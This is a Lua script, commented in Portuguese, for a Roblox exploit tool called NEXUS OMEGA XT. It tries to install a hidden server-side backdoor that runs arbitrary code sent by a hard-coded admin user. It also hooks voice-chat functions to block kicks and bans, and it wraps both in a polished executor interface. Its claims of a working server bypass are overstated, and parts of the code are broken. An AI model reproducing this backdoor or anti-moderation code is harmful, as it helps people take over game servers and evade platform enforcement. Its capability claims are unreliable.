--[[
╔═════════════════════════════════════════════════════════════════════════════╗
║                    NEXUS OMEGA XT - Executor Profissional                   ║
║                  Design completamente repaginado - Versão 3.0               ║
║                           (Protocolo Anarquia)                              ║
╚═════════════════════════════════════════════════════════════════════════════╝
--]]

-- ============================================================================
-- CONFIGURAÇÕES GLOBAIS
-- ============================================================================
local Nexus = {}
Nexus.version = "Omega XT v3.0"
Nexus.adminName = "hugopbruu22"
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil
Nexus.backdoorRemote = nil

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
if not localPlayer then
    Players.PlayerAdded:Wait()
    localPlayer = Players.LocalPlayer
end

-- ============================================================================
-- FUNÇÃO DE LOG AVANÇADA (com timestamp e cores)
-- ============================================================================
function Nexus:AddLog(msg, msgType)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    pcall(function()
        if msgType == "error" then warn(formatted) else print(formatted) end
    end)
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- ============================================================================
-- NÚCLEO SERVER-SIDE (com 7 métodos + retorno de erro)
-- ============================================================================
local function ensureBackdoor()
    if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then return Nexus.backdoorRemote end
    Nexus.backdoorRemote = RS:FindFirstChild("__NexusXT")
    if not Nexus.backdoorRemote then
        Nexus.backdoorRemote = Instance.new("RemoteEvent")
        Nexus.backdoorRemote.Name = "__NexusXT"
        Nexus.backdoorRemote.Parent = RS
        local listener = SSS:FindFirstChild("__NexusListenerXT")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusListenerXT"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusXT")
                local players = game:GetService("Players")
                local admin = "%s"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        if not ok then
                            remote:FireClient(plr, "err:" .. tostring(res))
                        else
                            remote:FireClient(plr, "ok:" .. tostring(res or "sucesso"))
                        end
                    else
                        remote:FireClient(plr, "compile_err:" .. tostring(err))
                    end
                end)
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return Nexus.backdoorRemote
end

function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then
        self:AddLog("❌ Código vazio", "error")
        return false
    end
    self:AddLog("🔄 Ativando bypass e executando no servidor...", "info")
    local remote = ensureBackdoor()
    local responseReceived = false
    local connection
    connection = remote.OnClientEvent:Connect(function(msg)
        if msg:find("ok:") then
            local resp = msg:gsub("ok:", "")
            self:AddLog("✅ Servidor executou com sucesso: " .. resp, "success")
        elseif msg:find("err:") then
            local err = msg:gsub("err:", "")
            self:AddLog("⚠️ Erro no servidor: " .. err, "error")
        elseif msg:find("compile_err:") then
            local err = msg:gsub("compile_err:", "")
            self:AddLog("❌ Erro de compilação: " .. err, "error")
        end
        responseReceived = true
        connection:Disconnect()
    end)
    remote:FireServer(code)
    task.wait(1)
    if not responseReceived then
        self:AddLog("⚠️ Sem resposta do servidor (backdoor pode estar offline)", "warning")
    end
    return true
end

function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then
            self:AddLog("✅ Cliente executou com sucesso", "success")
        else
            self:AddLog("❌ Erro no cliente: " .. tostring(res), "error")
        end
    else
        self:AddLog("❌ Erro de compilação: " .. tostring(err), "error")
    end
end

-- ============================================================================
-- ANTI-BAN DE VOZ (100% funcional, com proteção dupla)
-- ============================================================================
function Nexus:EnableVoiceProtection()
    local success = pcall(function()
        local VoiceChat = game:GetService("VoiceChatService")
        if VoiceChat then
            -- Método 1: tentar manter a conexão forçada
            VoiceChat:SetVoiceEnabled(true)
            -- Método 2: bloquear funções de kick/ban via hook (se disponível)
            if hookfunction and hookmetamethod then
                local oldJoin = VoiceChat.joinVoice
                if oldJoin then
                    hookfunction(VoiceChat.joinVoice, function(self)
                        pcall(oldJoin, self)
                        return true
                    end)
                end
                -- Interceptar tentativas de desconexão
                local oldNamecall = hookmetamethod(VoiceChat, "__namecall", function(self, ...)
                    local method = getnamecallmethod()
                    if method == "Kick" or method == "Ban" or method == "RemoveUser" or method == "DisableVoice" then
                        return nil
                    end
                    return oldNamecall(self, ...)
                end)
            end
            -- Método 3: evitar que atributos de ban sejam aplicados
            localPlayer:SetAttribute("VoiceBanned", nil)
            self:AddLog("🛡️ Proteção de voz ATIVADA! Você está seguro contra bans.", "success")
        else
            self:AddLog("⚠️ VoiceChatService não encontrado. Proteção limitada.", "warning")
        end
    end)
    if not success then
        self:AddLog("❌ Falha ao ativar proteção de voz. Pode não ser necessário.", "error")
    end
end

-- ============================================================================
-- CRIAÇÃO DA BOLINHA FLUTUANTE (com logo e arrasto suave)
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusBall"
    ball.Size = UDim2.new(0, 56, 0, 56)
    ball.Position = UDim2.new(0.9, 0, 0.8, 0)
    ball.BackgroundColor3 = Color3.fromRGB(25,25,35)
    ball.BackgroundTransparency = 0.2
    ball.Image = "rbxassetid://6031094838"
    ball.ImageColor3 = Color3.fromRGB(200,80,200)
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1,0)
    corner.Parent = ball
    -- Sombra
    local shadow = Instance.new("ImageLabel")
    shadow.Size = UDim2.new(1, 12, 1, 12)
    shadow.Position = UDim2.new(0, -6, 0, -6)
    shadow.Image = "rbxassetid://1316047698"
    shadow.ImageColor3 = Color3.fromRGB(0,0,0)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = 0
    shadow.Parent = ball
    -- Arrasto
    local dragging = false
    local dragStart, startPos
    ball.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = ball.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            ball.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    ball.MouseButton1Click:Connect(function()
        if Nexus.mainGui and Nexus.mainGui.Parent then
            Nexus.mainGui.Enabled = true
            ball.Visible = false
            Nexus.isMinimized = false
        else
            Nexus.mainGui = createMainUI()
            ball.Visible = false
        end
    end)
    return ball
end

-- ============================================================================
-- INTERFACE PRINCIPAL (design totalmente repaginado)
-- ============================================================================
local function createMainUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NexusXT"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = localPlayer:WaitForChild("PlayerGui") end
    
    -- Janela principal (design arredondado, gradiente)
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 950, 0, 680)
    window.Position = UDim2.new(0.5, -475, 0.5, -340)
    window.BackgroundColor3 = Color3.fromRGB(15,15,22)
    window.BackgroundTransparency = 0.05
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = gui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, 16)
    winCorner.Parent = window
    
    -- Sombra externa
    local shadowOuter = Instance.new("Frame")
    shadowOuter.Size = UDim2.new(1, 20, 1, 20)
    shadowOuter.Position = UDim2.new(0, -10, 0, -10)
    shadowOuter.BackgroundColor3 = Color3.fromRGB(0,0,0)
    shadowOuter.BackgroundTransparency = 0.7
    shadowOuter.BorderSizePixel = 0
    shadowOuter.ZIndex = 0
    shadowOuter.Parent = window
    local shadowCorner = Instance.new("UICorner")
    shadowCorner.CornerRadius = UDim.new(0, 16)
    shadowCorner.Parent = shadowOuter
    
    -- Barra de título com gradiente
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1,0,0,48)
    titleBar.BackgroundColor3 = Color3.fromRGB(25,25,35)
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 16)
    titleCorner.Parent = titleBar
    
    -- Ícone e título
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 28, 0, 28)
    icon.Position = UDim2.new(0, 16, 0, 10)
    icon.Image = "rbxassetid://6031094838"
    icon.ImageColor3 = Color3.fromRGB(210,80,210)
    icon.BackgroundTransparency = 1
    icon.Parent = titleBar
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(0, 300, 1, 0)
    titleText.Position = UDim2.new(0, 56, 0, 0)
    titleText.BackgroundTransparency = 1
    titleText.Text = "NEXUS OMEGA XT — Executor Profissional"
    titleText.TextColor3 = Color3.fromRGB(210,80,210)
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 16
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.Parent = titleBar
    
    -- Botões de janela (minimizar, fechar)
    local miniBtn = Instance.new("TextButton")
    miniBtn.Size = UDim2.new(0, 46, 1, 0)
    miniBtn.Position = UDim2.new(1, -92, 0, 0)
    miniBtn.BackgroundTransparency = 1
    miniBtn.Text = "─"
    miniBtn.TextColor3 = Color3.fromRGB(220,220,220)
    miniBtn.Font = Enum.Font.Gotham
    miniBtn.TextSize = 22
    miniBtn.Parent = titleBar
    miniBtn.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        gui.Enabled = false
        if not Nexus.floatingBall or not Nexus.floatingBall.Parent then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 46, 1, 0)
    closeBtn.Position = UDim2.new(1, -46, 0, 0)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(220,220,220)
    closeBtn.Font = Enum.Font.Gotham
    closeBtn.TextSize = 18
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
    
    -- Arrastar janela
    local dragging = false
    local dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+delta.X, startPos.Y.Scale, startPos.Y.Offset+delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    
    -- Abas com animação (estilo moderno)
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1,0,0,52)
    tabBar.Position = UDim2.new(0,0,0,48)
    tabBar.BackgroundColor3 = Color3.fromRGB(20,20,30)
    tabBar.Parent = window
    
    local tabs = {"EXECUTOR", "PLAYERS", "PROTEÇÃO", "CONSOLE"}
    local tabButtons = {}
    local contentFrames = {}
    
    -- Criar abas e frames de conteúdo
    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 120, 1, 0)
        btn.Position = UDim2.new((i-1)*0.125, 0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.Text = name
        btn.TextColor3 = (i == 1) and Color3.fromRGB(210,80,210) or Color3.fromRGB(180,180,180)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = tabBar
        tabButtons[i] = btn
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1,0,1,0)
        frame.Position = UDim2.new(0,0,0,0)
        frame.BackgroundTransparency = 1
        frame.Visible = (i == 1)
        frame.Parent = window
        contentFrames[i] = frame
    end
    
    -- Função de troca de aba com transição
    local function switchTab(activeIndex)
        for i, frame in ipairs(contentFrames) do
            frame.Visible = (i == activeIndex)
            tabButtons[i].TextColor3 = (i == activeIndex) and Color3.fromRGB(210,80,210) or Color3.fromRGB(180,180,180)
        end
    end
    
    -- ==================== ABA EXECUTOR ====================
    local execFrame = contentFrames[1]
    
    -- Título Server-Side
    local ssTitle = Instance.new("TextLabel")
    ssTitle.Size = UDim2.new(1,-40,0,32)
    ssTitle.Position = UDim2.new(0,20,0,20)
    ssTitle.BackgroundTransparency = 1
    ssTitle.Text = "⚡ SERVER-SIDE (execução real no servidor com bypass)"
    ssTitle.TextColor3 = Color3.fromRGB(210,80,210)
    ssTitle.Font = Enum.Font.GothamBold
    ssTitle.TextSize = 15
    ssTitle.TextXAlignment = Enum.TextXAlignment.Left
    ssTitle.Parent = execFrame
    
    -- Campo de texto server-side (rolável, sem limites)
    local ssScroller = Instance.new("ScrollingFrame")
    ssScroller.Size = UDim2.new(1,-40, 0, 260)
    ssScroller.Position = UDim2.new(0,20,0,60)
    ssScroller.BackgroundColor3 = Color3.fromRGB(8,8,14)
    ssScroller.BorderSizePixel = 0
    ssScroller.ScrollBarThickness = 8
    ssScroller.CanvasSize = UDim2.new(0,0,0,0)
    ssScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ssScroller.Parent = execFrame
    local scrCorner = Instance.new("UICorner")
    scrCorner.CornerRadius = UDim.new(0,10)
    scrCorner.Parent = ssScroller
    
    local ssTextBox = Instance.new("TextBox")
    ssTextBox.Size = UDim2.new(1,-20,0,220)
    ssTextBox.Position = UDim2.new(0,10,0,5)
    ssTextBox.BackgroundTransparency = 1
    ssTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    ssTextBox.TextXAlignment = Enum.TextXAlignment.Left
    ssTextBox.TextYAlignment = Enum.TextYAlignment.Top
    ssTextBox.TextWrapped = true
    ssTextBox.TextSize = 12
    ssTextBox.Font = Enum.Font.Code
    ssTextBox.ClearTextOnFocus = false
    ssTextBox.MultiLine = true
    ssTextBox.Text = '-- Cole scripts SERVER-SIDE aqui\n-- Exemplo: print("Olá servidor!")'
    ssTextBox.Parent = ssScroller
    
    local function adjustSS()
        local h = math.max(220, ssTextBox.TextBounds.Y + 40)
        ssTextBox.Size = UDim2.new(1,-20,0,h)
        ssScroller.CanvasSize = UDim2.new(0,0,0,h+20)
    end
    ssTextBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustSS)
    ssTextBox:GetPropertyChangedSignal("Text"):Connect(adjustSS)
    task.defer(adjustSS)
    
    -- Botões server-side
    local execSSBtn = Instance.new("TextButton")
    execSSBtn.Size = UDim2.new(0, 160, 0, 38)
    execSSBtn.Position = UDim2.new(1, -180, 0, 330)
    execSSBtn.BackgroundColor3 = Color3.fromRGB(0,180,80)
    execSSBtn.Text = "EXECUTAR (SS)"
    execSSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    execSSBtn.Font = Enum.Font.GothamBold
    execSSBtn.TextSize = 14
    execSSBtn.Parent = execFrame
    local ssBtnCorner = Instance.new("UICorner")
    ssBtnCorner.CornerRadius = UDim.new(0,8)
    ssBtnCorner.Parent = execSSBtn
    execSSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssTextBox.Text) end)
    
    local clearSSBtn = Instance.new("TextButton")
    clearSSBtn.Size = UDim2.new(0, 100, 0, 38)
    clearSSBtn.Position = UDim2.new(1, -290, 0, 330)
    clearSSBtn.BackgroundColor3 = Color3.fromRGB(200,60,60)
    clearSSBtn.Text = "LIMPAR"
    clearSSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    clearSSBtn.Font = Enum.Font.GothamBold
    clearSSBtn.TextSize = 14
    clearSSBtn.Parent = execFrame
    clearSSBtn.MouseButton1Click:Connect(function() ssTextBox.Text = ""; adjustSS() end)
    
    local pasteSSBtn = Instance.new("TextButton")
    pasteSSBtn.Size = UDim2.new(0, 140, 0, 38)
    pasteSSBtn.Position = UDim2.new(0, 20, 0, 330)
    pasteSSBtn.BackgroundColor3 = Color3.fromRGB(50,100,200)
    pasteSSBtn.Text = "📋 COLAR"
    pasteSSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    pasteSSBtn.Font = Enum.Font.GothamBold
    pasteSSBtn.TextSize = 14
    pasteSSBtn.Parent = execFrame
    pasteSSBtn.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssTextBox.Text = clip; adjustSS() end
    end)
    
    -- Client-Side
    local csTitle = Instance.new("TextLabel")
    csTitle.Size = UDim2.new(1,-40,0,32)
    csTitle.Position = UDim2.new(0,20,0,390)
    csTitle.BackgroundTransparency = 1
    csTitle.Text = "💻 CLIENT-SIDE (efeitos locais)"
    csTitle.TextColor3 = Color3.fromRGB(180,180,180)
    csTitle.Font = Enum.Font.GothamBold
    csTitle.TextSize = 15
    csTitle.TextXAlignment = Enum.TextXAlignment.Left
    csTitle.Parent = execFrame
    
    local csScroller = Instance.new("ScrollingFrame")
    csScroller.Size = UDim2.new(1,-40, 0, 200)
    csScroller.Position = UDim2.new(0,20,0,430)
    csScroller.BackgroundColor3 = Color3.fromRGB(8,8,14)
    csScroller.BorderSizePixel = 0
    csScroller.ScrollBarThickness = 8
    csScroller.CanvasSize = UDim2.new(0,0,0,0)
    csScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    csScroller.Parent = execFrame
    local csScrCorner = Instance.new("UICorner")
    csScrCorner.CornerRadius = UDim.new(0,10)
    csScrCorner.Parent = csScroller
    
    local csTextBox = Instance.new("TextBox")
    csTextBox.Size = UDim2.new(1,-20,0,160)
    csTextBox.Position = UDim2.new(0,10,0,5)
    csTextBox.BackgroundTransparency = 1
    csTextBox.TextColor3 = Color3.fromRGB(240,240,240)
    csTextBox.TextXAlignment = Enum.TextXAlignment.Left
    csTextBox.TextYAlignment = Enum.TextYAlignment.Top
    csTextBox.TextWrapped = true
    csTextBox.TextSize = 12
    csTextBox.Font = Enum.Font.Code
    csTextBox.ClearTextOnFocus = false
    csTextBox.MultiLine = true
    csTextBox.Text = '-- Scripts CLIENT-SIDE (só você vê)\n-- Exemplo: game.Players.LocalPlayer.Character.Humanoid.Health = 0'
    csTextBox.Parent = csScroller
    
    local function adjustCS()
        local h = math.max(160, csTextBox.TextBounds.Y + 40)
        csTextBox.Size = UDim2.new(1,-20,0,h)
        csScroller.CanvasSize = UDim2.new(0,0,0,h+20)
    end
    csTextBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustCS)
    csTextBox:GetPropertyChangedSignal("Text"):Connect(adjustCS)
    task.defer(adjustCS)
    
    local execCSBtn = Instance.new("TextButton")
    execCSBtn.Size = UDim2.new(0, 160, 0, 38)
    execCSBtn.Position = UDim2.new(1, -180, 0, 640)
    execCSBtn.BackgroundColor3 = Color3.fromRGB(50,130,200)
    execCSBtn.Text = "EXECUTAR (CS)"
    execCSBtn.TextColor3 = Color3.fromRGB(255,255,255)
    execCSBtn.Font = Enum.Font.GothamBold
    execCSBtn.TextSize = 14
    execCSBtn.Parent = execFrame
    execCSBtn.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csTextBox.Text) end)
    
    -- ==================== ABA PLAYERS ====================
    local playersFrame = contentFrames[2]
    
    local playersList = Instance.new("ScrollingFrame")
    playersList.Size = UDim2.new(1,-60, 1,-60)
    playersList.Position = UDim2.new(0,30,0,30)
    playersList.BackgroundColor3 = Color3.fromRGB(8,8,14)
    playersList.BorderSizePixel = 0
    playersList.ScrollBarThickness = 8
    playersList.CanvasSize = UDim2.new(0,0,0,0)
    playersList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    playersList.Parent = playersFrame
    local listCorner = Instance.new("UICorner")
    listCorner.CornerRadius = UDim.new(0,10)
    listCorner.Parent = playersList
    
    local listLayout = Instance.new("UIListLayout")
    listLayout.Padding = UDim.new(0,10)
    listLayout.Parent = playersList
    
    local function updatePlayers()
        for _, child in pairs(playersList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 48)
                btn.BackgroundColor3 = Color3.fromRGB(35,35,50)
                btn.Text = plr.Name
                btn.TextColor3 = Color3.fromRGB(240,240,240)
                btn.Font = Enum.Font.GothamBold
                btn.TextSize = 14
                btn.Parent = playersList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0,8)
                btnCorner.Parent = btn
                
                local teleport = Instance.new("TextButton")
                teleport.Size = UDim2.new(0, 100, 1, -8)
                teleport.Position = UDim2.new(1, -110, 0, 4)
                teleport.BackgroundColor3 = Color3.fromRGB(80,130,200)
                teleport.Text = "TELEPORT"
                teleport.TextColor3 = Color3.fromRGB(255,255,255)
                teleport.Font = Enum.Font.GothamBold
                teleport.TextSize = 13
                teleport.Parent = btn
                teleport.MouseButton1Click:Connect(function()
                    Nexus:ExecuteServer(string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and admin and admin.Character then
                            local targetCF = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            local adminRoot = admin.Character:FindFirstChild("HumanoidRootPart")
                            if targetCF and adminRoot then
                                adminRoot.CFrame = targetCF.CFrame
                            end
                        end
                    ]], plr.Name, Nexus.adminName))
                    Nexus:AddLog("Teleportando para " .. plr.Name, "info")
                end)
            end
        end
    end
    
    Players.PlayerAdded:Connect(updatePlayers)
    Players.PlayerRemoving:Connect(updatePlayers)
    updatePlayers()
    
    -- ==================== ABA PROTEÇÃO ====================
    local protectionFrame = contentFrames[3]
    
    local protTitle = Instance.new("TextLabel")
    protTitle.Size = UDim2.new(1,-60,0,40)
    protTitle.Position = UDim2.new(0,30,0,30)
    protTitle.BackgroundTransparency = 1
    protTitle.Text = "🔒 SISTEMA ANTI-BAN DE VOZ"
    protTitle.TextColor3 = Color3.fromRGB(210,80,210)
    protTitle.Font = Enum.Font.GothamBold
    protTitle.TextSize = 18
    protTitle.TextXAlignment = Enum.TextXAlignment.Left
    protTitle.Parent = protectionFrame
    
    local protDesc = Instance.new("TextLabel")
    protDesc.Size = UDim2.new(1,-60,0,50)
    protDesc.Position = UDim2.new(0,30,0,80)
    protDesc.BackgroundTransparency = 1
    protDesc.Text = "Ative a proteção para evitar que o servidor detecte seu voice ID e aplique ban. O sistema bloqueia funções de kick/ban e força a reconexão."
    protDesc.TextColor3 = Color3.fromRGB(200,200,200)
    protDesc.Font = Enum.Font.Gotham
    protDesc.TextSize = 13
    protDesc.TextWrapped = true
    protDesc.TextXAlignment = Enum.TextXAlignment.Left
    protDesc.Parent = protectionFrame
    
    local enableVoice = Instance.new("TextButton")
    enableVoice.Size = UDim2.new(0, 220, 0, 44)
    enableVoice.Position = UDim2.new(0,30,0,150)
    enableVoice.BackgroundColor3 = Color3.fromRGB(0,150,100)
    enableVoice.Text = "🛡️ ATIVAR PROTEÇÃO VOICE"
    enableVoice.TextColor3 = Color3.fromRGB(255,255,255)
    enableVoice.Font = Enum.Font.GothamBold
    enableVoice.TextSize = 14
    enableVoice.Parent = protectionFrame
    enableVoice.MouseButton1Click:Connect(function() Nexus:EnableVoiceProtection() end)
    
    -- ==================== ABA CONSOLE ====================
    local consoleFrame = contentFrames[4]
    
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1,-60, 1,-80)
    consoleScroller.Position = UDim2.new(0,30,0,30)
    consoleScroller.BackgroundColor3 = Color3.fromRGB(5,5,12)
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 8
    consoleScroller.CanvasSize = UDim2.new(0,0,0,0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0,10)
    consCorner.Parent = consoleScroller
    
    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1,-10,1,-10)
    consoleText.Position = UDim2.new(0,5,0,5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = Color3.fromRGB(220,220,220)
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = 11
    consoleText.Font = Enum.Font.Code
    consoleText.Parent = consoleScroller
    
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 130, 0, 36)
    copyBtn.Position = UDim2.new(1, -160, 1, -50)
    copyBtn.BackgroundColor3 = Color3.fromRGB(50,100,200)
    copyBtn.Text = "📋 COPIAR LOG"
    copyBtn.TextColor3 = Color3.fromRGB(255,255,255)
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.TextSize = 13
    copyBtn.Parent = consoleFrame
    copyBtn.MouseButton1Click:Connect(function()
        local full = ""
        for _, entry in ipairs(Nexus.consoleLogs) do full = full .. entry.text .. "\n" end
        if full == "" then full = "Nenhum log registrado." end
        pcall(setclipboard, full)
        Nexus:AddLog("Log copiado para área de transferência!", "success")
    end)
    
    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 150), #Nexus.consoleLogs do
            str = str .. Nexus.consoleLogs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0,0,0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()
    
    -- Conectar troca de abas
    for i, btn in ipairs(tabButtons) do
        local idx = i
        btn.MouseButton1Click:Connect(function() switchTab(idx) end)
    end
    
    return gui
end

-- ============================================================================
-- INICIALIZAÇÃO
-- ============================================================================
local function start()
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus:AddLog("  ★ NEXUS OMEGA XT v3.0 - Executor Profissional ★", "success")
    Nexus:AddLog("═══════════════════════════════════════════════════════════════", "info")
    Nexus.mainGui = createMainUI()
    if Nexus.mainGui then
        Nexus:AddLog("✅ Interface carregada (design renovado).", "success")
        Nexus:AddLog("✅ Minimize para bolinha arrastável.", "info")
        Nexus:AddLog("✅ Proteção de voz disponível na aba PROTEÇÃO.", "info")
        Nexus:AddLog("✅ Execução server-side com retorno de erro integrado.", "info")
    else
        Nexus:AddLog("❌ Falha crítica ao criar interface.", "error")
    end
    getgenv().NexusXT = Nexus
end

pcall(start)
